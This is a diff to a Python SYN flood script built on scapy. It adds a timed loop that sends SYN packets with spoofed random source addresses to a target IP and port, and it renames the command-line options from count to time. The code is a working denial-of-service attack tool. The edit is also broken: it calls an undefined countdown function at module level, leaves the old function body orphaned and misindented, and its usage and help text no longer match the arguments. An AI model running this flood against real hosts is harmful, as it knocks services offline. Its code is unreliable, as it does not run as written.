@@ -2,7 +2,7 @@
 # Emre Ovunc
 # info@emreovunc.com
 # Python3 SYN Flood Tool CMD v2.0.1
-
+import time
 from sys import stdout
 from scapy.all import *
 from random import randint
@@ -18,8 +18,31 @@ def randInt():
 	x = randint(1000, 9000)
 	return x
 
+# countdown timer 
+def SYN_Flood(dstIP, dstPort, counter,t):
+    while t: # while t > 0 for clarity 
+      mins = t // 60
+      secs = t % 60
+      timer = '{:02d}:{:02d}'.format(mins, secs)
+      s_port = randInt()
+      s_eq = randInt()
+      w_indow = randInt()
+      IP_Packet = IP ()
+      IP_Packet.src = randomIP()
+      IP_Packet.dst = dstIP
+      TCP_Packet = TCP ()
+      TCP_Packet.sport = s_port
+      TCP_Packet.dport = int(dstPort)
+      TCP_Packet.flags = "S"
+      TCP_Packet.seq = s_eq
+      TCP_Packet.window = w_indow
+      send(IP_Packet/TCP_Packet, verbose=0)
+      time.sleep(1)
+      t -= 1
+      
 
-def SYN_Flood(dstIP, dstPort, counter):
+countdown(int(t))
+
 	total = 0
 	print ("Packets are sending ...")
 
@@ -47,11 +70,11 @@ def SYN_Flood(dstIP, dstPort, counter):
 
 def main():
 	parser = ArgumentParser()
-	parser.add_argument('--target', '-t', help='target IP address')
+	parser.add_argument('-ip', '-i', help='target IP address')
 	parser.add_argument('--port', '-p', help='target port number')
-	parser.add_argument('--count', '-c', help='number of packets')
+	parser.add_argument('--time', '-t', help='time')
 	parser.add_argument('--version', '-v', action='version', version='Python SynFlood Tool v2.0.1\n@EmreOvunc')
-	parser.epilog = "Usage: python3 py3_synflood_cmd.py -t 10.20.30.40 -p 8080 -c 1"
+	parser.epilog = "Usage: python3 py3_synflood_cmd.py -i 10.20.30.40 -p 8080 -c 1"
 
 	args = parser.parse_args()
 
@@ -70,14 +93,14 @@ def main():
 			print('[?] -h for help')
 			exit()
 	else:
-		print('''usage: py3_synflood_cmd.py [-h] [--target TARGET] [--port PORT]
+		print('''usage: py3_synflood_cmd.py [-h] [--i ip] [--port PORT]
                            [--count COUNT] [--version]
 optional arguments:
   -h, --help            show this help message and exit
-  --target TARGET, -t TARGET
+  --ip ip, -i ip
                         target IP address
   --port PORT, -p PORT  target port number
-  --count COUNT, -c COUNT
+  --count time, -t time
                         number of packets
   --version, -v         show program's version number and exit''')
 		exit()
